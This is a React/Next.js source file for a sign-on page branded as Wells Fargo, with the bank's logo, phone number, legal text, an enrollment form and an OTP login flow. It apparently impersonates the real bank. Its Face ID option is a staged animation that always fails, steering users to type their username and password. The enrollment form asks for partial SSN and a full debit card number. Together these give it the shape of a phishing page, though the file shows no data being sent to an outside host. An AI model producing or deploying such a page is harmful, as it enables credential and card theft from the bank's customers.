"use client";

import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useRef, useState } from "react";
import {
  ArrowRight, CheckCircle2, CreditCard, Eye, EyeOff,
  Home, Lock, PiggyBank, ScanFace, TrendingUp, User, X,
  PhoneCall, MapPin, AlertCircle,
} from "lucide-react";
import Button from "@/components/Button";
import { useAuth, verifyCredentials } from "@/lib/auth";

const REMEMBER_KEY = "wf_remember_userid";

function useGreeting() {
  const [text, setText] = useState("Welcome");
  useEffect(() => {
    const h = new Date().getHours();
    setText(h < 12 ? "Good morning" : h < 18 ? "Good afternoon" : "Good evening");
  }, []);
  return text;
}

const products = [
  { label: "Credit Cards", icon: CreditCard, desc: "Rewards & cash back" },
  { label: "Home Loans",   icon: Home,       desc: "Competitive rates"  },
  { label: "Savings",      icon: PiggyBank,  desc: "High-yield options" },
  { label: "Investing",    icon: TrendingUp, desc: "Grow your wealth"   },
];

/* ─── Reusable modal shell ─────────────────────────────────────────────────── */
function Modal({ onClose, children }: { onClose: () => void; children: React.ReactNode }) {
  return (
    <div
      className="fixed inset-0 z-50 bg-black/50 flex items-end sm:items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="w-full max-w-md bg-white rounded-3xl shadow-xl overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {children}
      </div>
    </div>
  );
}

/* ─── Face ID modal ─────────────────────────────────────────────────────────── */
function FaceIdModal({ onClose }: { onClose: () => void }) {
  const [phase, setPhase] = useState<"scanning" | "error">("scanning");

  useEffect(() => {
    const t = setTimeout(() => setPhase("error"), 2200);
    return () => clearTimeout(t);
  }, []);

  return (
    <Modal onClose={onClose}>
      <div className="px-6 py-8 flex flex-col items-center text-center">
        {phase === "scanning" ? (
          <>
            <div className="relative h-24 w-24 flex items-center justify-center">
              <span className="absolute inset-0 rounded-full border-4 border-[#D71E28]/20 animate-ping" />
              <span className="absolute inset-2 rounded-full border-4 border-[#D71E28] border-t-transparent animate-spin" />
              <ScanFace size={36} className="text-[#D71E28] relative z-10" />
            </div>
            <h2 className="mt-6 text-xl font-bold text-[#2D2926]">Face ID</h2>
            <p className="mt-2 text-sm text-[#6D6E71]">Keep your face in frame…</p>
            <p className="mt-1 text-xs text-[#9AA0A6]">Scanning biometric data</p>
          </>
        ) : (
          <>
            <div className="h-20 w-20 rounded-full bg-red-100 flex items-center justify-center">
              <AlertCircle size={36} className="text-[#D71E28]" />
            </div>
            <h2 className="mt-5 text-xl font-bold text-[#2D2926]">Unable to verify</h2>
            <p className="mt-2 text-[14px] text-[#6D6E71] leading-relaxed max-w-xs">
              Face ID is not available right now. Please use your username and password to sign on.
            </p>
            <p className="mt-1 text-xs text-[#9AA0A6]">
              To enable Face ID, go to your device Settings → Face ID & Passcode.
            </p>
            <Button variant="primary" fullWidth size="lg" className="mt-6" onClick={onClose}>
              Use Username &amp; Password
            </Button>
          </>
        )}
        <button
          onClick={onClose}
          className="mt-4 text-sm font-semibold text-[#D71E28] hover:underline"
        >
          Cancel
        </button>
      </div>
    </Modal>
  );
}

/* ─── Forgot modal ──────────────────────────────────────────────────────────── */
function ForgotModal({ onClose }: { onClose: () => void }) {
  return (
    <Modal onClose={onClose}>
      <div className="border-b border-[#E6E8EB] px-6 py-4 flex items-center justify-between">
        <h2 className="text-[17px] font-bold text-[#2D2926]">Forgot sign-on info?</h2>
        <button onClick={onClose} className="h-8 w-8 rounded-full hover:bg-[#F5F5F5] flex items-center justify-center text-[#6D6E71]">
          <X size={18} />
        </button>
      </div>
      <div className="px-6 py-5 space-y-4">
        <p className="text-[14px] text-[#6D6E71] leading-relaxed">
          We can help you recover your sign-on information. Choose one of the options below:
        </p>
        <a
          href="tel:18008693557"
          className="flex items-center gap-4 p-4 rounded-2xl border border-[#E6E8EB] hover:border-[#D71E28] hover:bg-red-50/50 transition group"
        >
          <span className="h-11 w-11 rounded-xl bg-[#D71E28]/10 text-[#D71E28] flex items-center justify-center shrink-0 group-hover:bg-[#D71E28] group-hover:text-white transition">
            <PhoneCall size={20} />
          </span>
          <div>
            <p className="text-[14px] font-bold text-[#2D2926]">Call us</p>
            <p className="text-xs text-[#6D6E71]">1-800-869-3557 · Available 24/7</p>
          </div>
        </a>
        <div className="flex items-center gap-4 p-4 rounded-2xl border border-[#E6E8EB] hover:border-[#D71E28] hover:bg-red-50/50 transition group cursor-pointer">
          <span className="h-11 w-11 rounded-xl bg-[#D71E28]/10 text-[#D71E28] flex items-center justify-center shrink-0 group-hover:bg-[#D71E28] group-hover:text-white transition">
            <MapPin size={20} />
          </span>
          <div>
            <p className="text-[14px] font-bold text-[#2D2926]">Visit a branch</p>
            <p className="text-xs text-[#6D6E71]">Bring a valid government-issued ID</p>
          </div>
        </div>
        <p className="text-[11px] text-[#9AA0A6] text-center leading-relaxed">
          Wells Fargo will never ask for your full password over the phone or email.
        </p>
      </div>
    </Modal>
  );
}

/* ─── Enroll modal ──────────────────────────────────────────────────────────── */
function EnrollModal({ onClose }: { onClose: () => void }) {
  const [step, setStep] = useState<"form" | "success">("form");
  const [name, setName] = useState("");
  const [ssn, setSsn] = useState("");
  const [email, setEmail] = useState("");
  const [cardNum, setCardNum] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const err: Record<string, string> = {};
    if (!name.trim()) err.name = "Full name is required.";
    if (!ssn || ssn.length !== 4) err.ssn = "Enter the last 4 digits of your SSN.";
    if (!email.includes("@")) err.email = "Enter a valid email address.";
    if (!cardNum || cardNum.length < 16) err.cardNum = "Enter your 16-digit debit card number.";
    if (Object.keys(err).length) { setErrors(err); return; }
    setStep("success");
  };

  const field = (
    id: string,
    label: string,
    value: string,
    onChange: (v: string) => void,
    opts?: { type?: string; placeholder?: string; maxLength?: number; inputMode?: "numeric" | "email" }
  ) => (
    <div>
      <label className="block text-[12px] font-semibold text-[#2D2926] mb-1">{label}</label>
      <input
        type={opts?.type ?? "text"}
        inputMode={opts?.inputMode}
        placeholder={opts?.placeholder}
        maxLength={opts?.maxLength}
        value={value}
        onChange={(e) => { onChange(e.target.value); if (errors[id]) setErrors((p) => { const c = {...p}; delete c[id]; return c; }); }}
        className={`w-full px-3.5 py-2.5 rounded-xl border text-sm text-[#2D2926] placeholder-[#B0B4BA] focus:outline-none focus:ring-2 transition ${errors[id] ? "border-red-400 focus:ring-red-100" : "border-[#E6E8EB] bg-[#FAFAFA] focus:border-[#D71E28] focus:ring-[#D71E28]/15"}`}
      />
      {errors[id] && <p className="mt-1 text-xs text-red-600">{errors[id]}</p>}
    </div>
  );

  return (
    <Modal onClose={onClose}>
      <div className="border-b border-[#E6E8EB] px-6 py-4 flex items-center justify-between">
        <h2 className="text-[17px] font-bold text-[#2D2926]">Enroll in Online Banking</h2>
        <button onClick={onClose} className="h-8 w-8 rounded-full hover:bg-[#F5F5F5] flex items-center justify-center text-[#6D6E71]">
          <X size={18} />
        </button>
      </div>

      {step === "success" ? (
        <div className="px-6 py-8 flex flex-col items-center text-center">
          <div className="h-20 w-20 rounded-full bg-emerald-500 flex items-center justify-center animate-check-pop">
            <CheckCircle2 size={40} className="text-white" />
          </div>
          <h3 className="mt-5 text-xl font-bold text-[#2D2926]">Account Set Up!</h3>
          <p className="mt-2 text-[14px] text-[#6D6E71] leading-relaxed max-w-xs">
            Your Wells Fargo Online Banking enrollment has been received. Please visit your nearest Wells Fargo branch with a valid government-issued ID to complete verification and activate your account.
          </p>
          <Button variant="primary" fullWidth size="lg" className="mt-6" onClick={onClose}>
            Done
          </Button>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className="px-6 py-5 space-y-3">
          <p className="text-[13px] text-[#6D6E71] mb-1">To enroll, we need a few details to verify your identity.</p>
          {field("name", "Full Legal Name", name, setName, { placeholder: "As it appears on your account" })}
          {field("ssn", "Last 4 digits of SSN", ssn, (v) => setSsn(v.replace(/\D/g, "")), { inputMode: "numeric", maxLength: 4, placeholder: "XXXX" })}
          {field("email", "Email Address", email, setEmail, { type: "email", inputMode: "email", placeholder: "your@email.com" })}
          {field("cardNum", "Debit Card Number", cardNum, (v) => setCardNum(v.replace(/\D/g, "")), { inputMode: "numeric", maxLength: 16, placeholder: "16-digit card number" })}
          <Button type="submit" variant="primary" fullWidth size="lg" className="mt-2">
            Submit Enrollment
          </Button>
          <p className="text-[11px] text-[#9AA0A6] text-center leading-relaxed">
            By enrolling, you agree to the Wells Fargo Online Access Agreement. Your information is encrypted and secure.
          </p>
        </form>
      )}
    </Modal>
  );
}

/* ─── Agreement modal ───────────────────────────────────────────────────────── */
function AgreementModal({ onClose }: { onClose: () => void }) {
  return (
    <Modal onClose={onClose}>
      <div className="border-b border-[#E6E8EB] px-6 py-4 flex items-center justify-between">
        <h2 className="text-[17px] font-bold text-[#2D2926]">Online Access Agreement</h2>
        <button onClick={onClose} className="h-8 w-8 rounded-full hover:bg-[#F5F5F5] flex items-center justify-center text-[#6D6E71]">
          <X size={18} />
        </button>
      </div>
      <div className="px-6 py-5 max-h-[60vh] overflow-y-auto space-y-3 text-[13px] text-[#6D6E71] leading-relaxed">
        <p className="font-bold text-[#2D2926]">Wells Fargo Bank, N.A. — Online Access Agreement</p>
        <p>This Online Access Agreement ("Agreement") governs your use of Wells Fargo's digital banking services, including online and mobile banking, bill pay, transfers, and any other services accessed through the Wells Fargo website or mobile application.</p>
        <p className="font-semibold text-[#2D2926]">1. Acceptance of Terms</p>
        <p>By accessing or using Wells Fargo's online services, you agree to be bound by this Agreement, our Privacy Policy, and all applicable laws and regulations. If you do not agree, do not use these services.</p>
        <p className="font-semibold text-[#2D2926]">2. Account Security</p>
        <p>You are responsible for maintaining the confidentiality of your username, password, and one-time passcodes. Wells Fargo will never ask you to share your full password, OTP, or PIN via phone, email, or text.</p>
        <p className="font-semibold text-[#2D2926]">3. Electronic Communications</p>
        <p>You consent to receive account notices, statements, and disclosures electronically. You may opt out by visiting a branch or calling 1-800-869-3557.</p>
        <p className="font-semibold text-[#2D2926]">4. Transfers & Payments</p>
        <p>Transfers initiated before the cutoff time on a business day will generally be processed the same day. Wire transfers and Zelle® payments may be irreversible. Review all details before confirming.</p>
        <p className="font-semibold text-[#2D2926]">5. Limitation of Liability</p>
        <p>Wells Fargo's liability for unauthorized transactions is limited as described in the Electronic Fund Transfer Act. Report unauthorized transactions within 60 days of your statement date.</p>
        <p className="text-[11px] text-[#9AA0A6] pt-2">Effective Date: January 1, 2026. Wells Fargo Bank, N.A. Member FDIC. Equal Housing Lender.</p>
      </div>
      <div className="px-6 pb-6 pt-2">
        <Button variant="primary" fullWidth onClick={onClose}>I Understand</Button>
      </div>
    </Modal>
  );
}

/* ─── Login page ────────────────────────────────────────────────────────────── */
export default function LoginPage() {
  const { user } = useAuth();
  const router = useRouter();
  const greeting = useGreeting();
  const [userId, setUserId]     = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw]     = useState(false);
  const [remember, setRemember] = useState(false);
  const [error, setError]       = useState("");
  const [submitting, setSubmitting] = useState(false);

  const [showFaceId, setShowFaceId]     = useState(false);
  const [showForgot, setShowForgot]     = useState(false);
  const [showEnroll, setShowEnroll]     = useState(false);
  const [showAgreement, setShowAgreement] = useState(false);

  useEffect(() => {
    if (user) router.replace("/dashboard");
  }, [user, router]);

  useEffect(() => {
    try {
      const saved = localStorage.getItem(REMEMBER_KEY);
      if (saved) { setUserId(saved); setRemember(true); }
    } catch { /* ignore */ }
  }, []);

  const handleSubmit = async (e: { preventDefault(): void }) => {
    e.preventDefault();
    if (!userId.trim() || !password) {
      setError("Please enter your username and password.");
      return;
    }
    setError("");
    setSubmitting(true);

    const cred = verifyCredentials(userId, password);
    if (!cred.ok) {
      setError(cred.error);
      setSubmitting(false);
      return;
    }

    try {
      if (remember) localStorage.setItem(REMEMBER_KEY, userId);
      else          localStorage.removeItem(REMEMBER_KEY);
    } catch { /* ignore */ }

    try {
      const res  = await fetch("/api/send-login-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: cred.userId }),
      });
      const data = await res.json();
      if (!data.ok) {
        setError(data.error || "Failed to send verification code.");
        setSubmitting(false);
        return;
      }
      const otpParams = new URLSearchParams({
        uid: data.userInternalId,
        email: data.maskedEmail,
        ...(data.devCode ? { dc: data.devCode } : {}),
      });
      router.push(`/login-otp?${otpParams.toString()}`);
    } catch {
      setError("Something went wrong. Please try again.");
      setSubmitting(false);
    }
  };

  return (
    <>
      <main className="min-h-screen flex flex-col bg-[#F5F5F5]">
        {/* ── Red hero section ─────────────────────────────────────────── */}
        <div
          className="relative flex flex-col items-center justify-end pb-10 pt-16"
          style={{ background: "linear-gradient(155deg,#D71E28 0%,#A01B22 60%,#7A1218 100%)" }}
        >
          <div className="absolute top-[-40px] right-[-30px] h-[220px] w-[220px] rounded-full bg-white/10 blur-3xl pointer-events-none" />
          <div className="absolute bottom-[20px] left-[-20px] h-[160px] w-[160px] rounded-full bg-white/8 blur-2xl pointer-events-none" />

          <div className="relative z-10 flex flex-col items-center">
            <div className="h-[80px] w-[80px] rounded-[22px] bg-white shadow-lift flex items-center justify-center">
              <Image src="/well_logo.png" alt="Wells Fargo" width={64} height={64} priority className="rounded-[16px]" />
            </div>
            <div className="mt-4 text-center">
              <p className="text-[13px] font-semibold tracking-[0.2em] text-white/60 uppercase">Wells Fargo</p>
              <h1 className="mt-1 text-[28px] font-bold text-white leading-tight">{greeting}</h1>
              <p className="mt-1 text-[14px] text-white/70 font-medium">Sign on to your accounts</p>
            </div>
          </div>

          <div className="absolute bottom-0 left-0 right-0 h-8 bg-[#F5F5F5] rounded-t-[32px]" />
        </div>

        {/* ── Form card ────────────────────────────────────────────────── */}
        <div className="flex-1 flex flex-col items-center px-5 pt-2 pb-10">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-3xl shadow-soft border border-[#E6E8EB] p-6 sm:p-8">
              <h2 className="text-[18px] font-bold text-[#2D2926] mb-5">Sign On</h2>

              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Username */}
                <div>
                  <label className="block text-[13px] font-semibold text-[#2D2926] mb-1.5">Username</label>
                  <div className="relative">
                    <User size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6]" />
                    <input
                      type="text"
                      autoComplete="username"
                      placeholder="Enter username"
                      value={userId}
                      onChange={(e) => setUserId(e.target.value)}
                      className="w-full pl-10 pr-4 py-3 rounded-xl border border-[#E6E8EB] bg-[#FAFAFA] text-sm text-[#2D2926] placeholder-[#B0B4BA] focus:border-[#D71E28] focus:outline-none focus:ring-2 focus:ring-[#D71E28]/15 transition"
                    />
                  </div>
                </div>

                {/* Password */}
                <div>
                  <label className="block text-[13px] font-semibold text-[#2D2926] mb-1.5">Password</label>
                  <div className="relative">
                    <Lock size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6]" />
                    <input
                      type={showPw ? "text" : "password"}
                      autoComplete="current-password"
                      placeholder="Enter password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full pl-10 pr-11 py-3 rounded-xl border border-[#E6E8EB] bg-[#FAFAFA] text-sm text-[#2D2926] placeholder-[#B0B4BA] focus:border-[#D71E28] focus:outline-none focus:ring-2 focus:ring-[#D71E28]/15 transition"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPw((v) => !v)}
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6] hover:text-[#6D6E71] transition"
                      aria-label={showPw ? "Hide password" : "Show password"}
                    >
                      {showPw ? <EyeOff size={16} /> : <Eye size={16} />}
                    </button>
                  </div>
                </div>

                {/* Remember + Face ID */}
                <div className="flex items-center justify-between pt-0.5">
                  <label className="inline-flex items-center gap-2 cursor-pointer select-none">
                    <div
                      onClick={() => setRemember((v) => !v)}
                      className={`h-5 w-5 rounded-md border-2 flex items-center justify-center cursor-pointer transition-all ${remember ? "bg-[#D71E28] border-[#D71E28]" : "border-[#D0D5DD] bg-white"}`}
                    >
                      {remember && (
                        <svg viewBox="0 0 10 8" fill="none" className="h-3 w-3">
                          <path d="M1 4l2.5 2.5L9 1" stroke="white" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                      )}
                    </div>
                    <span className="text-[13px] text-[#2D2926] font-medium">Save username</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowFaceId(true)}
                    className="inline-flex items-center gap-1.5 text-[13px] font-semibold text-[#D71E28] hover:underline active:opacity-70 transition"
                  >
                    <ScanFace size={15} /> Face ID
                  </button>
                </div>

                {/* Error */}
                {error && (
                  <div className="rounded-xl bg-red-50 border border-red-100 px-4 py-3 text-[13px] text-[#A01B22] leading-snug">
                    {error}
                  </div>
                )}

                {/* Submit */}
                <Button type="submit" variant="primary" fullWidth size="lg" disabled={submitting}>
                  {submitting ? "Signing on…" : "Sign On"}
                  {!submitting && <ArrowRight size={16} />}
                </Button>

                {/* Forgot */}
                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => setShowForgot(true)}
                    className="text-[13px] font-semibold text-[#D71E28] hover:underline"
                  >
                    Forgot username or password?
                  </button>
                </div>
              </form>

              {/* Divider */}
              <div className="flex items-center gap-3 my-5">
                <div className="flex-1 h-px bg-[#E6E8EB]" />
                <span className="text-[11px] text-[#9AA0A6] font-semibold uppercase tracking-wider">or</span>
                <div className="flex-1 h-px bg-[#E6E8EB]" />
              </div>

              {/* Enroll */}
              <p className="text-center text-[13px] text-[#6D6E71]">
                New to Wells Fargo?{" "}
                <button
                  type="button"
                  onClick={() => setShowEnroll(true)}
                  className="font-semibold text-[#D71E28] hover:underline"
                >
                  Enroll in Online Banking
                </button>
              </p>
            </div>

            {/* ── Explore products ───────────────────────────────────── */}
            <div className="mt-6">
              <p className="text-[11px] font-semibold text-[#9AA0A6] uppercase tracking-wider text-center mb-4">
                Explore our products
              </p>
              <div className="grid grid-cols-2 gap-3">
                {products.map(({ label, icon: Icon, desc }) => (
                  <a
                    key={label}
                    href="#"
                    className="flex items-center gap-3 p-4 rounded-2xl bg-white border border-[#E6E8EB] shadow-card hover:border-[#D71E28] hover:shadow-soft transition-all group"
                  >
                    <span className="h-10 w-10 rounded-xl bg-[#D71E28]/10 text-[#D71E28] flex items-center justify-center shrink-0 group-hover:bg-[#D71E28] group-hover:text-white transition-colors">
                      <Icon size={18} />
                    </span>
                    <div className="min-w-0">
                      <p className="text-[13px] font-bold text-[#2D2926] leading-tight">{label}</p>
                      <p className="text-[11px] text-[#9AA0A6] mt-0.5">{desc}</p>
                    </div>
                  </a>
                ))}
              </div>
            </div>

            {/* Legal footer */}
            <p className="mt-6 text-[11px] text-[#9AA0A6] text-center leading-relaxed px-2">
              Wells Fargo Bank, N.A. Member FDIC. Equal Housing Lender.
              <br />
              By signing on you agree to our{" "}
              <button
                type="button"
                onClick={() => setShowAgreement(true)}
                className="underline hover:text-[#6D6E71]"
              >
                Online Access Agreement
              </button>
              .
            </p>
          </div>
        </div>
      </main>

      {/* ── Modals ────────────────────────────────────────────────────── */}
      {showFaceId   && <FaceIdModal   onClose={() => setShowFaceId(false)} />}
      {showForgot   && <ForgotModal   onClose={() => setShowForgot(false)} />}
      {showEnroll   && <EnrollModal   onClose={() => setShowEnroll(false)} />}
      {showAgreement && <AgreementModal onClose={() => setShowAgreement(false)} />}
    </>
  );
}
